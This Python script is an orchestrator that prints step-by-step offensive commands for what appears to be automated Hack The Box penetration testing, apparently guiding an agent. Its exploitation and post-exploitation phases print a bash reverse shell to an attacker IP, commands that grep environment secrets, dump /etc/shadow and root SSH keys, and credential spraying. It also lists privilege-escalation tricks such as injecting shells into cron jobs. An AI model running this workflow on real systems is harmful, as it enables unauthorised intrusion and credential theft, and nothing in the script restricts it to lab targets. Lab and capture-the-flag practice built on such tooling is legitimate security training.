#!/usr/bin/env python3
"""Orchestrator think engine — reads state, outputs next action.
Upgraded with lessons from 2Million (easy) and Snapped (hard, active) HTB boxes."""
import json, sys, os

state_file = sys.argv[1] if len(sys.argv) > 1 else 'state/orchestrator.json'

with open(state_file) as f:
    s = json.load(f)

target = s['target']
phase = s['phase']
sub = s['sub_phase']
attempt = s.get('attempt', 0)
report_dir = s.get('report_dir', f'reports/{target}')

print("╔══════════════════════════════════════════════════════════════╗")
print("║  🧠 NEXT ACTION                                             ║")
print("╚══════════════════════════════════════════════════════════════╝")
print()

# ═══════════════════════════════════════════════════════════════
# RECON PHASE
# ═══════════════════════════════════════════════════════════════
if phase == 'recon':
    if sub == 'portscan':
        print(f"  📍 Phase: RECON → Port Scan")
        print(f"  🎯 Target: {target}")
        print()
        print("  RUN THIS COMMAND:")
        print(f"    nmap -sC -sV -O -A -p- --min-rate 3000 -oA {report_dir}/full-scan {target}")
        print()
        print("  THEN REPORT RESULTS:")
        print('    bash scripts/orchestrator.sh report "port 22 open SSH OpenSSH 8.9, port 80 open HTTP nginx redirect to hostname.htb"')
        print()
        print("  FORMAT: List each open port with service, version, and any redirect/hostname info")

    elif sub == 'udp_scan':
        print(f"  📍 Phase: RECON → UDP Scan")
        print()
        print("  RUN THIS COMMAND:")
        print(f"    nmap -sU --top-ports 50 --min-rate 2000 -oA {report_dir}/udp-scan {target}")
        print()
        print('  REPORT: "no udp services" OR "port 161 open SNMP, port 53 open DNS"')

    elif sub == 'hostname_check':
        print(f"  📍 Phase: RECON → Hostname Resolution")
        hostnames = s.get('hostnames', [])
        print(f"  Hostnames found: {', '.join(hostnames)}")
        print()
        print("  ADD TO /etc/hosts:")
        for h in hostnames:
            print(f"    echo '{target} {h}' | sudo tee -a /etc/hosts")
        print()
        print("  If no sudo, use Host header trick:")
        for h in hostnames:
            print(f"    curl -s -H 'Host: {h}' http://{target}/")
        print()
        print('  REPORT: "hostname added" OR "no sudo, using Host header"')

    # ─── NEW: VHOST/SUBDOMAIN ENUMERATION ─────────
    elif sub == 'vhost_enum':
        print(f"  📍 Phase: RECON → Virtual Host / Subdomain Enumeration")
        hostnames = s.get('hostnames', [])
        base_domain = hostnames[0] if hostnames else target
        print()
        print("  ⚠️  CRITICAL: Many boxes hide key services behind subdomains!")
        print()
        print("  STEP 1 — Find the default response size to filter:")
        print(f"    curl -s -o /dev/null -w '%{{http_code}} %{{size_download}}' -H 'Host: nonexistent.{base_domain}' http://{target}/")
        print()
        print("  STEP 2 — Fuzz vhosts (replace SIZE with the default response size):")
        print(f"    ffuf -u http://{target} -H 'Host: FUZZ.{base_domain}' \\")
        print(f"      -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \\")
        print(f"      -mc all -fc 302 -fs SIZE -t 50")
        print()
        print("  STEP 3 — Also try manual checks for common subdomains:")
        common_subs = ['admin', 'api', 'dev', 'staging', 'portal', 'dashboard', 'git', 'jenkins', 'monitor', 'grafana', 'internal', 'test', 'beta', 'app', 'mail', 'vpn']
        print(f"    for sub in {' '.join(common_subs)}; do")
        print(f"      RESP=$(curl -s -o /dev/null -w '%{{http_code}}|%{{size_download}}' -H \"Host: ${{sub}}.{base_domain}\" http://{target}/)")
        print(f'      echo "$sub → $RESP"')
        print(f"    done")
        print()
        print("  Add any found subdomains to /etc/hosts, then report ALL found subdomains")
        print('  REPORT: "found admin.domain.htb, api.domain.htb" OR "no subdomains found"')

    elif sub == 'service_enum':
        print(f"  📍 Phase: RECON → Service Enumeration")
        print()
        services = s.get('services', {})
        for port, info in services.items():
            svc = info.get('service', 'unknown')
            ver = info.get('version', '')
            print(f"  Port {port}: {svc} {ver}")
            if 'http' in svc.lower() or 'web' in svc.lower() or port in ['80', '443', '8080', '8443']:
                print(f"    → whatweb -a 3 http://{target}")
                print(f"    → curl -s http://{target} | head -50")
            elif 'smb' in svc.lower() or port in ['445', '139']:
                print(f"    → enum4linux -a {target}")
            elif 'ssh' in svc.lower():
                print(f"    → searchsploit {svc} {ver}")
            elif 'ftp' in svc.lower():
                print(f"    → ftp {target} (try anonymous)")
        print()
        print("  READ: knowledge-base/checklists/enumeration-checklist.md")
        print("  REPORT what you learned about each service")

# ═══════════════════════════════════════════════════════════════
# WEB ENUMERATION PHASE
# ═══════════════════════════════════════════════════════════════
elif phase == 'web_enum':
    if sub == 'tech_detect':
        print(f"  📍 Phase: WEB ENUM → Technology Detection")
        hostnames = s.get('hostnames', [target])
        all_hosts = list(set(hostnames + s.get('subdomains', [])))
        print()
        print("  FOR EACH HOSTNAME/SUBDOMAIN, run:")
        for h in (all_hosts if all_hosts else [target]):
            print(f"    curl -s -I http://{h}/")
            print(f"    curl -s http://{h}/ | head -100")
        print()
        print("  LOOK FOR:")
        print("    - CMS (WordPress, Joomla, Drupal, custom)")
        print("    - Management panels (Nginx UI, phpMyAdmin, Jenkins, etc.)")
        print("    - Login pages, registration, invite codes")
        print("    - API endpoints (/api, /api/v1)")
        print("    - JavaScript files (may contain hidden endpoints)")
        print("    - Comments in HTML source")
        print()
        print('  REPORT: "PHP app, login at /login, API at /api, nginx-ui management panel on admin.host"')

    elif sub == 'dir_bruteforce':
        print(f"  📍 Phase: WEB ENUM → Directory Bruteforce")
        hostnames = s.get('hostnames', [target])
        all_hosts = list(set(hostnames + s.get('subdomains', [])))
        print()
        print("  RUN FOR EACH HOST:")
        for h in (all_hosts if all_hosts else [target]):
            print(f"    gobuster dir -u http://{h} -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak -t 30 --no-error")
        print()
        print("  REPORT all interesting paths found")

    # ─── NEW: SENSITIVE FILE CHECK ─────────────────
    elif sub == 'sensitive_files':
        print(f"  📍 Phase: WEB ENUM → Sensitive File & Backup Check")
        hostnames = s.get('hostnames', [target])
        all_hosts = list(set(hostnames + s.get('subdomains', [])))
        print()
        print("  ⚠️  CRITICAL: Backup files and config dumps are HIGH-VALUE targets!")
        print("  Many apps expose backups, .env, database dumps without authentication.")
        print()
        print("  CHECK EACH HOST for sensitive files:")
        for h in (all_hosts if all_hosts else [target]):
            print(f"    for f in .env .env.bak .git/HEAD robots.txt sitemap.xml \\")
            print(f"      api/backup api/settings api/config backup backup.zip \\")
            print(f"      api/v1 api/debug .well-known/security.txt config.json \\")
            print(f"      server-status server-info debug info phpinfo.php; do")
            print(f"      CODE=$(curl -s -o /dev/null -w '%{{http_code}}' http://{h}/$f)")
            print(f'      [ "$CODE" != "404" ] && echo "[$CODE] http://{h}/$f"')
            print(f"    done")
        print()
        print("  IF BACKUP FOUND: Download it! Check headers for encryption keys.")
        print("  IF .ENV FOUND: Read it — contains DB credentials, API keys, secrets.")
        print("  IF API FOUND: Enumerate all endpoints (GET /api, GET /api/v1)")
        print()
        print("  REPORT: List all non-404 responses with status codes")

    elif sub == 'api_enum':
        print(f"  📍 Phase: WEB ENUM → API Enumeration")
        api_paths = [p for p in s.get('web_paths', []) if 'api' in p.lower()]
        print(f"  Known API paths: {', '.join(api_paths) if api_paths else 'none yet'}")
        print()
        print("  RUN THESE:")
        for p in api_paths:
            print(f"    curl -s http://{target}{p} | python3 -m json.tool")
        print()
        print("  LOOK FOR:")
        print("    - Admin/user management endpoints")
        print("    - Settings update endpoints (check if they require auth!)")
        print("    - File upload/download/backup endpoints")
        print("    - Invite/register endpoints")
        print("    - Endpoints that accept user input → potential injection")
        print()
        print("  TRY WITHOUT AUTH — some endpoints may be unprotected!")
        print("  REPORT: List all endpoints, which require auth, and what they do")

    # ─── NEW: CVE RESEARCH ─────────────────────────
    elif sub == 'cve_research':
        print(f"  📍 Phase: WEB ENUM → CVE Research")
        services = s.get('services', {})
        findings = s.get('findings', [])
        print()
        print("  ⚠️  SEARCH FOR KNOWN VULNERABILITIES in every identified service!")
        print()
        print("  FOR EACH SERVICE VERSION:")
        for port, info in services.items():
            svc = info.get('service', '')
            ver = info.get('version', '')
            if ver:
                print(f"    searchsploit {svc} {ver}")
        print()
        print("  FOR WEB APPS (detected CMS/panel/framework):")
        # Extract app names from findings
        apps = [f for f in findings if any(kw in f.lower() for kw in ['nginx-ui', 'wordpress', 'jenkins', 'drupal', 'joomla', 'grafana', 'gitlab', 'panel', 'cms'])]
        if apps:
            for a in apps:
                print(f"    → Research CVEs for: {a}")
        print(f"    python3 skills/tavily-search-pro/lib/tavily_search.py search \"APP_NAME VERSION CVE exploit RCE\" -n 5")
        print()
        print("  CHECK EXPLOIT-DB:")
        print(f"    searchsploit --www APP_NAME")
        print()
        print("  CHECK GITHUB for PoC exploits:")
        print(f"    python3 skills/tavily-search-pro/lib/tavily_search.py search \"APP_NAME CVE POC github exploit\" -n 5")
        print()
        print("  REPORT: List all CVEs found with severity and whether PoC exists")

    elif sub == 'vuln_scan':
        print(f"  📍 Phase: WEB ENUM → Automated Vulnerability Scanning")
        print()
        print("  RUN THESE:")
        print(f"    nikto -h http://{target}")
        print(f"    nuclei -u http://{target} -severity critical,high")
        print()
        print("  REPORT all vulnerabilities found")

# ═══════════════════════════════════════════════════════════════
# EXPLOITATION PHASE
# ═══════════════════════════════════════════════════════════════
elif phase == 'exploit':
    if sub == 'plan':
        print(f"  📍 Phase: EXPLOIT → Plan Attack")
        print()
        print("  FINDINGS SO FAR:")
        for f in s.get('findings', []):
            print(f"    📝 {f}")
        print()
        print("  DECIDE: Which vulnerability to exploit first?")
        print("  Priority order (easiest → hardest):")
        print("    1. Unauthenticated endpoints (backup download, info leak)")
        print("    2. Known CVE with public PoC")
        print("    3. Command injection → direct RCE")
        print("    4. SQL injection → database access → creds")
        print("    5. File upload → webshell")
        print("    6. Default/weak creds → admin panel → RCE")
        print("    7. Authentication bypass → admin access")
        print("    8. Brute force (LAST RESORT — slow and noisy)")
        print()
        print("  READ: knowledge-base/mitre-attack/techniques/web-exploitation.md")
        print('  REPORT: bash scripts/orchestrator.sh report "attacking via [method] in [endpoint]"')

    elif sub == 'execute':
        print(f"  📍 Phase: EXPLOIT → Execute Attack")
        attack_plan = s.get('attack_plan', 'Check findings for exploitable vulnerability')
        print(f"  PLAN: {attack_plan}")
        print()
        print("  SET UP LISTENER FIRST:")
        print("    nc -nlvp 4444")
        print()
        print("  REVERSE SHELL CHEATSHEET:")
        print("    Bash:   bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'")
        print("    Python: python3 -c 'import socket,subprocess,os;...'")
        print("    More:   cat knowledge-base/checklists/reverse-shells.md")
        print()
        print("  Get YOUR IP: ip addr show tun0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1")
        print()
        print("  IF SHELL OBTAINED: bash scripts/orchestrator.sh report 'got shell as www-data'")
        print("  IF FAILED: bash scripts/orchestrator.sh error 'payload was filtered'")

    elif sub == 'stabilize':
        print(f"  📍 Phase: EXPLOIT → Stabilize Shell & Gather Info")
        print()
        print("  UPGRADE SHELL:")
        print("    python3 -c 'import pty;pty.spawn(\"/bin/bash\")'")
        print("    Ctrl+Z → stty raw -echo; fg → export TERM=xterm")
        print()
        print("  GATHER ALL INFO (run all of these):")
        print("    whoami && id && hostname")
        print("    cat /etc/os-release | head -3")
        print("    uname -a")
        print("    cat .env 2>/dev/null")
        print("    find / -name '.env' -readable 2>/dev/null | head -5")
        print("    cat /etc/passwd | grep sh$")
        print("    ls -la /home/")
        print("    env | grep -iE 'pass|key|secret|token'")
        print()
        print("  REPORT: Include ALL output (users, OS version, any passwords/secrets found)")

    # ─── NEW: WEB APP ADMIN EXPLOITATION ──────────
    elif sub == 'web_app_admin':
        print(f"  📍 Phase: EXPLOIT → Web App Admin Exploitation")
        print()
        print("  You have admin access to a web application. Enumerate what it can do:")
        print()
        print("  CHECK THESE CAPABILITIES:")
        print("    1. BACKUP/RESTORE — can you download/upload backups? (may contain secrets)")
        print("    2. CONFIG EDITING — can you modify server configs? (may lead to RCE)")
        print("    3. TERMINAL/SHELL — does the app have a web terminal feature?")
        print("    4. FILE UPLOAD — can you upload files? (webshell)")
        print("    5. COMMAND EXECUTION — settings like 'restart command', 'test command'?")
        print("    6. USER MANAGEMENT — can you create admin users?")
        print("    7. API TOKENS/SECRETS — visible in settings/config?")
        print("    8. DATABASE ACCESS — can you view/export database?")
        print()
        print("  KEY TECHNIQUE: Download backups → decrypt → extract passwords/hashes → crack")
        print("  KEY TECHNIQUE: Modify app config → inject command in restart/test/exec fields")
        print("  KEY TECHNIQUE: Restore tampered backup → change startup command for shell access")
        print()
        print("  REPORT: List all capabilities found and which are exploitable")

# ═══════════════════════════════════════════════════════════════
# POST-EXPLOITATION PHASE
# ═══════════════════════════════════════════════════════════════
elif phase == 'postex':
    if sub == 'user_flag':
        print(f"  📍 Phase: POST-EXPLOITATION → Get User Flag")
        print()
        print("  CHECK FOR FLAGS:")
        print("    find /home -name 'user.txt' 2>/dev/null")
        print("    cat /home/*/user.txt 2>/dev/null")
        print()
        creds = s.get('credentials', [])
        if creds:
            print("  CREDENTIALS FOUND — try SSH/su:")
            for c in creds:
                if isinstance(c, dict):
                    print(f"    ssh {c.get('user','')}@{target}  # password: {c.get('pass','')}")
                    print(f"    su {c.get('user','')}")
                else:
                    print(f"    {c}")
        print()
        print("  REPORT: the flag hash and how you got it")

    # ─── NEW: CREDENTIAL REUSE CHECK ──────────────
    elif sub == 'cred_reuse':
        print(f"  📍 Phase: POST-EXPLOITATION → Credential Reuse Check")
        creds = s.get('credentials', [])
        print()
        print("  ⚠️  ALWAYS check if discovered passwords work on OTHER services/users!")
        print()
        if creds:
            print("  CREDENTIALS TO TRY:")
            for c in creds:
                if isinstance(c, dict):
                    print(f"    🔑 {c.get('user','')}:{c.get('pass','')} (source: {c.get('source','')})")
                else:
                    print(f"    🔑 {c}")
        print()
        print("  GET ALL USERS:")
        print("    cat /etc/passwd | grep sh$ | cut -d: -f1")
        print()
        print("  TRY EACH PASSWORD ON EACH USER:")
        print(f"    ssh USER@{target}")
        print("    su - USER")
        print()
        print("  TRY ON ALL SERVICES:")
        print(f"    crackmapexec ssh {target} -u USERS_FILE -p PASSWORDS_FILE")
        print()
        print("  IF YOU FOUND HASHES: Crack them first!")
        print("    john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt")
        print("    hashcat -m MODE hashes.txt /usr/share/wordlists/rockyou.txt")
        print()
        print("  REPORT: which credentials worked on which service/user")

    elif sub == 'privesc_enum':
        print(f"  📍 Phase: POST-EXPLOITATION → Privilege Escalation Enumeration")
        print()
        print("  READ: playbooks/privilege-escalation.md")
        print()
        print("  RUN ALL OF THESE (comprehensive check):")
        print("    # Quick wins")
        print("    sudo -l")
        print("    find / -perm -4000 -type f 2>/dev/null")
        print("    getcap -r / 2>/dev/null")
        print()
        print("    # Scheduled tasks")
        print("    cat /etc/crontab && ls -la /etc/cron* && crontab -l 2>/dev/null")
        print("    systemctl list-timers 2>/dev/null | head -15")
        print()
        print("    # Kernel & OS")
        print("    uname -a  # kernel version → search for exploits")
        print("    cat /etc/os-release | head -3")
        print()
        print("    # Mail & hints (CRITICAL — often contains clues!)")
        print("    cat /var/mail/* 2>/dev/null")
        print("    cat /var/spool/mail/* 2>/dev/null")
        print()
        print("    # Service analysis")
        print("    ps aux | grep '^root' | grep -v '\\[' | head -20")
        print("    systemctl list-units --type=service --state=running 2>/dev/null | head -20")
        print()
        print("    # Config files & databases")
        print("    find / -name '*.ini' -o -name '*.conf' -o -name '*.db' -o -name '*.sqlite' 2>/dev/null | grep -v proc | head -20")
        print("    find / -name '.env' -readable 2>/dev/null")
        print()
        print("    # Writable files & directories")
        print("    find /etc -writable 2>/dev/null | head -10")
        print("    find / -writable -type f 2>/dev/null | grep -vE 'proc|sys|run/user' | head -20")
        print()
        print("    # Internal services")
        print("    ss -tlnp")
        print("    cat /etc/hosts")
        print()
        print("    # Container/virtualization")
        print("    docker ps 2>/dev/null; id | grep docker")
        print("    ls /.dockerenv 2>/dev/null")
        print()
        print("  TRANSFER PSPY for hidden cron jobs:")
        print("    # On attacker: scp /path/to/pspy64 USER@TARGET:/tmp/")
        print("    # On target: timeout 120 /tmp/pspy64 -pf | grep UID=0")
        print()
        print("  REPORT: everything you find (sudo, SUID, kernel, mail hints, services, writable files)")

    elif sub == 'privesc_exploit':
        print(f"  📍 Phase: POST-EXPLOITATION → Exploit Privilege Escalation")
        privesc_vector = s.get('privesc_vector', 'unknown')
        print(f"  VECTOR DETECTED: {privesc_vector}")
        print()
        print("  COMMON PRIVESC PATHS (priority order):")
        print("    1. sudo -l misconfiguration → GTFOBins.github.io")
        print("    2. SUID binary abuse → GTFOBins.github.io")
        print("    3. Writable cron job → inject reverse shell")
        print("    4. Kernel exploit → searchsploit 'linux kernel VERSION'")
        print("    5. Docker/LXD group → mount host filesystem")
        print("    6. Service running as root → exploit through its config/interface")
        print("    7. Writable systemd service → modify ExecStart")
        print("    8. Capabilities abuse → getcap / GTFOBins")
        print("    9. NFS no_root_squash → mount and create SUID")
        print("   10. Writable /etc/passwd → add root user")
        print()
        print("  IF KERNEL EXPLOIT NEEDED:")
        print("    1. Check if target has gcc/make: which gcc make")
        print("    2. If no internet on target, compile locally and transfer:")
        print(f"       scp exploit USER@{target}:/tmp/")
        print("       OR python3 -m http.server 8080 + wget on target")
        print()
        print("  IF WEB APP RUNS AS LOW-PRIV USER BUT MANAGES ROOT SERVICES:")
        print("    → Can you write configs that root processes load?")
        print("    → Can you trigger a root process restart with modified config?")
        print("    → Check if backup restore can overwrite system files")
        print("    → Check MCP/API endpoints for config write capabilities")
        print()
        print("  REPORT: 'got root uid=0' or bash scripts/orchestrator.sh error 'exploit failed'")

    elif sub == 'root_flag':
        print(f"  📍 Phase: POST-EXPLOITATION → Get Root Flag")
        print()
        print("  YOU ARE ROOT. Grab everything:")
        print("    cat /root/root.txt")
        print("    cat /etc/shadow")
        print("    ls -la /root/")
        print("    cat /root/.bash_history 2>/dev/null")
        print()
        print("  REPORT: the root flag hash and any additional loot")

    elif sub == 'loot':
        print(f"  📍 Phase: POST-EXPLOITATION → Collect Loot")
        print()
        print("  COLLECT ALL VALUABLE DATA:")
        print("    cat /etc/shadow")
        print("    mysql -u USER -pPASS DB -e 'SELECT * FROM users' 2>/dev/null")
        print("    find / -name '*.conf' -exec grep -l 'pass' {} \\; 2>/dev/null | head -20")
        print("    cat /root/.ssh/id_rsa 2>/dev/null")
        print()
        print("  REPORT: all credentials and sensitive data found")

# ═══════════════════════════════════════════════════════════════
# REPORTING PHASE
# ═══════════════════════════════════════════════════════════════
elif phase == 'report':
    print(f"  📍 Phase: REPORTING → Write Attack Report")
    print()
    print(f"  Template: templates/attack-report-template.md")
    print(f"  Output:   {report_dir}/attack-report.md")
    print()
    print("  INCLUDE IN REPORT:")
    print("  ── Findings ──")
    for f in s.get('findings', []):
        print(f"    {f}")
    print("  ── Credentials ──")
    for c in s.get('credentials', []):
        print(f"    {c}")
    print("  ── Shells ──")
    for sh in s.get('shells', []):
        print(f"    {sh}")
    print("  ── Flags ──")
    for k, v in s.get('flags', {}).items():
        print(f"    {k}: {v}")
    print()
    print('  After writing report: bash scripts/orchestrator.sh report "report written"')

elif phase == 'complete':
    print("  🎉 ENGAGEMENT COMPLETE!")
    print()
    print(f"  Report: {report_dir}/attack-report.md")
    print()
    print("  ── Final Summary ──")
    for k, v in s.get('flags', {}).items():
        print(f"    🏴 {k}: {v}")
    for c in s.get('credentials', []):
        print(f"    🔑 {c}")

else:
    print(f"  Unknown phase: {phase}/{sub}")
    print("  Run: bash scripts/orchestrator.sh status")
